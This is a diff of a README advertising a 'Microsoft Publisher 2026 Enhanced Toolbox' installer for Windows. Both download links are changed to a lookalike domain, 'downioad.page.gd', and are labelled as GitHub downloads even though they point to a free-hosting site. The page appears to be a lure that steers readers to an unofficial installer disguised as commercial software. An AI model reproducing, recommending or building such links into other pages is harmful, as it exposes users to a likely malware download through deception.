@@ -2,7 +2,7 @@
 
 Welcome to the Microsoft Publisher 2026 Enhanced Toolbox, a comprehensive suite of tools designed to augment your publishing capabilities. Whether you are a professional designer or a casual user, this toolbox provides advanced features to create, customize, and publish stunning documents with ease on Windows 10 and 11. Dive into a world of enhanced productivity and creativity.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -74,6 +74,6 @@ Updates are released periodically to add new features, fix bugs, and ensure comp
 
 For direct access to the installer, please use the link below:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This software is provided for educational and personal use. The developers are not liable for any damages arising from its use. Last Updated: 2026.
